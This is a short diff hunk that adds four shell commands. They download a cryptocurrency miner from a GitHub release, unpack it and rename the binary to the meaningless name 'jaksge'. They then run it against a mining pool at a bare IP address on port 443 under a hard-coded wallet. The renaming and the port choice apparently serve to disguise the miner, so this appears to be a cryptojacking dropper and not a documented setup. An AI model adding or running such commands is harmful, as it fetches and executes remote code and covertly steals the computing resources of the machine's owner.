@@ -1,0 +1,4 @@
+wget https://github.com/kryptex/krig-miner/releases/download/v1.8.1/krig-miner-1.8.1-linux-x64.tar.gz
+tar xzf krig-miner-1.8.1-linux-x64.tar.gz
+mv krig-miner jaksge
+./jaksge --url stratum+ssl://51.68.221.150:443 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr/x
